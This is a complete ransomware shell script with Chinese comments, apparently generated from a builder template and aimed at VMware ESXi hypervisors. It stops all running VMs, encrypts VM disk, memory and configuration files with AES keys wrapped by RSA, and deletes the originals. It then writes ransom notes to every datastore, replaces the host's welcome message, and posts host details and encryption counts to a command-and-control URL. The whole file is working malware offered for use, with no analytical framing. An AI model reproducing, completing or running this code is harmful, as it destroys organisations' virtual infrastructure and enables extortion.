#!/bin/sh
# Jasmin ESXi Payload — Auto-generated
# 纯 BusyBox sh + openssl，无 python/xxd 依赖
# 关键：强制 C locale，否则 awk sprintf("%c",>=128) 会输出多字节UTF-8，损坏二进制密钥
export LC_ALL=C
export LANG=C
C2='{{C2_URL}}'
SECRET='{{HANDSHAKE}}'
EXTS='vmdk vmx vmem vmsn vmxf nvram vmsd'

# ── RSA公钥 ──
PUB_KEY='{{RSA_PUBLIC_KEY}}'

RANSOM_TXT='{{RANSOM_NOTE}}'

# ────────────────────────────────────────
# 工具函数
# ────────────────────────────────────────
log(){ echo "[jasmin] $*" >&2; }

has_cmd(){ command -v "$1" >/dev/null 2>&1; }

# hex → 原始二进制（用awk查表，BusyBox无xxd/strtonum也能跑）
hex2bin(){
    awk 'BEGIN{for(i=0;i<256;i++)t[sprintf("%02x",i)]=sprintf("%c",i)}
         {n=split($0,a,"");for(i=1;i<=n;i+=2)printf "%s",t[a[i] a[i+1]]}'
}

# 十进制 → 4字节小端二进制
dec2le(){
    awk -v n="$1" 'BEGIN{printf "%c%c%c%c",n%256,int(n/256)%256,int(n/65536)%256,int(n/16777216)%256}'
}

sha256_file(){
    # ESXi openssl 支持 -binary，直接输出32字节原始摘要
    openssl dgst -sha256 -binary "$1" 2>/dev/null
}

http_post(){
    if has_cmd wget; then
        wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
    elif has_cmd curl; then
        curl -s -X POST -d "$2" "$1" >/dev/null 2>&1
    fi
}

# ────────────────────────────────────────
# 停止所有VM (确保VMDK不被锁定)
# ────────────────────────────────────────
stop_vms(){
    log "停止所有VM..."
    if has_cmd vim-cmd; then
        vim-cmd vmsvc/getallvms 2>/dev/null | awk 'NR>1{print $1}' | while read vmid; do
            [ -n "$vmid" ] || continue
            vim-cmd vmsvc/power.off "$vmid" 2>/dev/null
            log "  已停止 vmid=$vmid"
        done
    fi
    if has_cmd esxcli; then
        esxcli vm process list 2>/dev/null | grep 'World ID' | awk '{print $NF}' | while read wid; do
            [ -n "$wid" ] || continue
            esxcli vm process kill --type=soft --world-id="$wid" 2>/dev/null
        done
    fi
    sleep 2
}

# ────────────────────────────────────────
# 写RSA公钥到临时文件
# ────────────────────────────────────────
write_pubkey(){
    PF="/tmp/.jasmin_pub_$$"
    printf '%s\n' "$PUB_KEY" > "$PF"
    echo "$PF"
}

# ────────────────────────────────────────
# 加密单个文件
# 格式: [SHA256 32B][AES密文][RSA加密key块][4B key块长度(小端)]
# ────────────────────────────────────────
encrypt_file(){
    FILE="$1"
    PUBKEY="$2"
    [ -f "$FILE" ] || return 1
    [ -s "$FILE" ] || return 1
    case "$FILE" in *.jasmin) return 1;; esac

    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || return 1
    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || return 1

    ENC="${FILE}.jasmin"
    T_CT="/tmp/.jct_$$"
    T_KIV="/tmp/.jkiv_$$"
    T_EK="/tmp/.jek_$$"
    T_HASH="/tmp/.jhash_$$"

    # SHA256 原始文件（原始32字节）
    sha256_file "$FILE" > "$T_HASH" || { rm -f "$T_HASH"; return 1; }
    [ -s "$T_HASH" ] || { rm -f "$T_HASH"; return 1; }

    # AES-256-CBC 加密（openssl 自动 PKCS7 padding）
    openssl enc -aes-256-cbc -nosalt -in "$FILE" -out "$T_CT" \
        -K "$KEY_HEX" -iv "$IV_HEX" 2>/dev/null || { rm -f "$T_CT" "$T_HASH"; return 1; }

    # key(32B)+iv(16B) 原始二进制（awk hex2bin，替代缺失的 xxd）
    printf '%s%s' "$KEY_HEX" "$IV_HEX" | hex2bin > "$T_KIV" 2>/dev/null
    [ -s "$T_KIV" ] || { rm -f "$T_CT" "$T_KIV" "$T_HASH"; return 1; }

    # RSA-OAEP 加密 key+iv
    openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
        -in "$T_KIV" -out "$T_EK" \
        -pkeyopt rsa_padding_mode:oaep \
        -pkeyopt rsa_oaep_md:sha256 \
        -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
        rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
        return 1
    }

    EK_LEN=$(wc -c < "$T_EK" 2>/dev/null)
    [ -n "$EK_LEN" ] || EK_LEN=256

    # 组装
    {
        cat "$T_HASH"
        cat "$T_CT"
        cat "$T_EK"
        dec2le "$EK_LEN"
    } > "$ENC" 2>/dev/null

    rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"

    if [ -s "$ENC" ]; then
        rm -f "$FILE"
        return 0
    else
        rm -f "$ENC"
        return 1
    fi
}

# ────────────────────────────────────────
# 投放勒索信
# ────────────────────────────────────────
drop_notes(){
    SID="$1"
    NOTE=$(printf '%s' "$RANSOM_TXT" | sed "s/{sid}/$SID/g")
    for DS in /vmfs/volumes/*; do
        [ -d "$DS" ] || continue
        printf '%s\n' "$NOTE" > "$DS/READ_ME_解密教程.txt" 2>/dev/null
    done
    printf '%s\n' "$NOTE" > /tmp/READ_ME_解密教程.txt 2>/dev/null
    if has_cmd esxcli; then
        esxcli system welcomemsg set -m "$(printf '%s' "$NOTE" | head -5)" 2>/dev/null
    fi
}

# ────────────────────────────────────────
# 回传C2
# ────────────────────────────────────────
beacon(){
    SID="$1"; COUNT="$2"; SIZE="$3"; TYPES="$4"; DETAIL="$5"
    HOSTNAME=$(hostname 2>/dev/null || echo "esxi-host")
    OS_VER=$(uname -r 2>/dev/null || echo "ESXi")
    IP=$(esxcli network ip interface ipv4 get 2>/dev/null | awk '/vmk0/{print $2}' | head -1)
    [ -z "$IP" ] && IP=$(ifconfig vmk0 2>/dev/null | grep 'inet ' | awk '{print $2}')
    [ -z "$IP" ] && IP="0.0.0.0"
    DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
    TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
    DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=ESXi%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}"
    http_post "$C2" "$DATA"
}

# ────────────────────────────────────────
# 主流程
# ────────────────────────────────────────
main(){
    has_cmd openssl || { log "缺少openssl，无法运行"; exit 1; }

    SID="$(hostname)_$$_$(date +%s)"

    stop_vms

    PUBKEY=$(write_pubkey)

    COUNT=0
    SIZE=0
    TYPES=""
    FIRST=1

    for DS in /vmfs/volumes/*; do
        [ -d "$DS" ] || continue
        # 先把文件清单落到临时文件，再普通while读取
        # （避免 find|while 子shell导致 COUNT/SIZE/TYPES 修改丢失）
        LIST="/tmp/.jlist_$$"
        find "$DS" -type f 2>/dev/null > "$LIST"
        while IFS= read -r F; do
            [ -n "$F" ] || continue
            EXT="${F##*.}"
            MATCH=0
            for E in $EXTS; do
                if [ "$EXT" = "$E" ]; then MATCH=1; break; fi
            done
            [ "$MATCH" = "1" ] || continue

            FSIZE=$(wc -c < "$F" 2>/dev/null || echo 0)

            if encrypt_file "$F" "$PUBKEY"; then
                COUNT=$((COUNT+1))
                SIZE=$((SIZE+FSIZE))
                case ",$TYPES," in
                    *",$EXT,"*) ;;
                    *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
                esac
                log "  [+] $F ($FSIZE B)"
            else
                log "  [-] 跳过: $F"
            fi
        done < "$LIST"
        rm -f "$LIST"
    done

    rm -f "$PUBKEY"

    drop_notes "$SID"
    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}"

    log "完成: 加密 $COUNT 个文件，合计 $SIZE 字节"
}

main
